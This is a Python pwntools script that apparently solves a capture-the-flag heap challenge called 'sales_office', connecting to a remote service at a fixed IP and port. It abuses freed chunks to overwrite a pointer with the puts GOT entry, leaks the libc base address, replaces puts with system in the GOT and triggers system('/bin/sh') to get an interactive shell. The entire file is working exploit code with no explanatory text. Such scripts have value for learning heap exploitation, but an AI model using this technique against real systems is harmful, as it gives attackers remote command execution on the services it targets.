#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./sales_office')
    elf = ELF('./sales_office')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('183.129.189.60', 10011)
    elf = ELF('./sales_office')
    libc = ELF('./libc.so')

def cmd(c):
    p.recvuntil('choice:')
    p.sendline(str(c))

def buy(sz, content):
    cmd(1)
    p.recvuntil('house:\n')
    p.sendline(str(sz))
    p.recvuntil('house:\n')
    p.send(content)

def show(idx):
    cmd(3)
    p.recvuntil('index:\n')
    p.sendline(str(idx))

def sell(idx):
    cmd(4)
    p.recvuntil('index:\n')
    p.sendline(str(idx))

def exit():
    cmd(5)

puts_got = elf.got['puts']

buy(0x18, '0') # 0
buy(0x18, '1') # 1
buy(0x28, '2') # 2
buy(0x18, '3') # 3
buy(0x18, '4') # 4
sell(0)
sell(1)
sell(2)
buy(0x18, p64(puts_got) + p64(0x18)) # 5
show(1)
p.recvuntil('house:\n')
libc_base = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - libc.symbols['puts']
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']

sell(4)
sell(3)
sell(5)
sell(1)
buy(0x18, '/bin/sh\x00') # 6
buy(0x18, '/bin/sh\x00') # 7
buy(0x18, '/bin/sh\x00') # 8
buy(0x18, p64(puts_got)) # 9
buy(0x28, '/bin/sh\x00') # 10
buy(0x18, p64(system_addr)) # 11
cmd(3)
p.sendline('10')
#gdb.attach(p)

p.interactive()

